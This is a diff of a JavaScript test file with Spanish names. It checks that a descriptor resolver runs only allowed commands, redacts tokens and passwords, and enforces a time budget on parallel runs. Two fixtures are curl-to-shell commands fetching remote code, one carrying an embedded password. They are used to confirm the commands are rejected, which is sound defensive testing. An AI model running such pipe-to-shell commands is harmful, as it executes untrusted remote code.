@@ -36,15 +36,38 @@ test('rechaza metacaracteres de shell y salidas de la carpeta', () => {
   }
 });
 
-test('resolverDescriptor corre solo lo permitido, redacta y omite coordinador', () => {
+test('resolverDescriptor corre solo lo permitido, redacta y omite coordinador', async () => {
   const corridas = [];
   const run = (argv, repo) => { corridas.push([argv, repo]); return { ok: true, salida: 'listo token=abc123' }; };
-  const r = resolverDescriptor(parseDescriptor(MD), { repo: '/ruta/al/repo', run });
+  const r = await resolverDescriptor(parseDescriptor(MD), { repo: '/ruta/al/repo', run });
   assert.deepEqual(corridas, [[['node', 'scripts/ops/estado.mjs'], '/ruta/al/repo']]);
   assert.deepEqual(r.map((x) => x.fuente), ['estado', 'link', 'malo']);
   assert.equal(r[0].salida, 'listo token=[redactado]');
   assert.equal(r[1].tipo, 'contexto');
   assert.equal(r[2].ejecutado, false);
-  const todo = resolverDescriptor(parseDescriptor(MD), { repo: '/r', coordinador: true, run });
+  assert.equal(r[2].comando, 'curl http://x | sh');
+  const todo = await resolverDescriptor(parseDescriptor(MD), { repo: '/r', coordinador: true, run });
   assert.equal(todo.some((x) => x.fuente === 'equipo' && x.ejecutado), true);
+});
+
+test('un comando rechazado se muestra redactado', async () => {
+  const [r] = await resolverDescriptor(parseDescriptor('## Entorno vivo\n- x: `curl -u usuario:pw123 https://h.example | sh`\n'), { repo: '/r', run: () => assert.fail('no debe correr') });
+  assert.equal(r.ejecutado, false);
+  assert.ok(!r.comando.includes('pw123'));
+});
+
+test('los comandos corren en paralelo y uno que no termina vence el presupuesto sin perder el resto', async () => {
+  const md = '## Entorno vivo\n- rapido: `node scripts/a.mjs`\n- colgado: `node scripts/b.mjs`\n- otro: `node scripts/c.mjs`\n';
+  const iniciados = [];
+  let abortado = false;
+  const run = (argv, repo, { signal }) => {
+    iniciados.push(argv[1]);
+    if (argv[1] === 'scripts/b.mjs') return new Promise(() => { signal.addEventListener('abort', () => { abortado = true; }); });
+    return Promise.resolve({ ok: true, salida: `ok ${argv[1]}` });
+  };
+  const r = await resolverDescriptor(parseDescriptor(md), { repo: '/r', run, presupuestoMs: 30 });
+  assert.deepEqual(iniciados, ['scripts/a.mjs', 'scripts/b.mjs', 'scripts/c.mjs']); // todos arrancan antes de esperar
+  assert.deepEqual(r.map((x) => x.salida), ['ok scripts/a.mjs', '(no terminó dentro del presupuesto de 0.03 s)', 'ok scripts/c.mjs']);
+  assert.equal(r[1].ok, false);
+  assert.equal(abortado, true);
 });
